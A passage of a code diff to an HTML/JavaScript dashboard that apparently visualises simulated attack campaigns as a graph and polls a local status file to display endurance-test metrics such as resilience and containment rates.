-    b.style.background = "";
-    b.style.color = "";
     b.style.borderColor = "";
+    b.style.color = "";
+    b.style.boxShadow = "";
   }
 }
 
@@ -517,10 +908,31 @@ document.getElementById("btnRun").onclick    = ()=>runKillChainCampaign();
 document.getElementById("btnLoop").onclick   = ()=>toggleLoop();
 document.getElementById("btnReset").onclick  = ()=>{ if(loopActive) toggleLoop(); resetWalk(); };
 
-renderToggles();
-renderGraph();
-renderLinear();
+// Initial setup
+selectCampaign("clickfix");
 setView("dag");
+
+// Live endurance polling
+async function pollEnduranceStatus() {
+  try {
+    const res = await fetch('/docs/swarm/results/endurance_state.json?t=' + Date.now());
+    if (res.ok) {
+      const data = await res.json();
+      const banner = document.getElementById("enduranceBanner");
+      if (banner && data.status === "RUNNING") {
+        banner.style.display = "flex";
+        document.getElementById("endurancePattern").textContent = `Suite: ${data.current_pattern_suite || 'Active Multi-Vector'}`;
+        document.getElementById("enduranceProbes").textContent = (data.probes_evaluated || 0).toLocaleString();
+        document.getElementById("enduranceResilience").textContent = `${((data.resilience_rate || 0) * 100).toFixed(1)}%`;
+        document.getElementById("enduranceDod").textContent = (data.average_depth_of_defense || 0).toFixed(2);
+        document.getElementById("enduranceContainment").textContent = `${((data.campaign_containment_rate || 1.0) * 100).toFixed(0)}%`;
+        document.getElementById("enduranceGaps").textContent = (data.evasion_gaps || 0).toLocaleString();
+      }
+    }
+  } catch(e) {}
+}
+setInterval(pollEnduranceStatus, 2500);
+pollEnduranceStatus();
 </script>
 </body>
 </html>
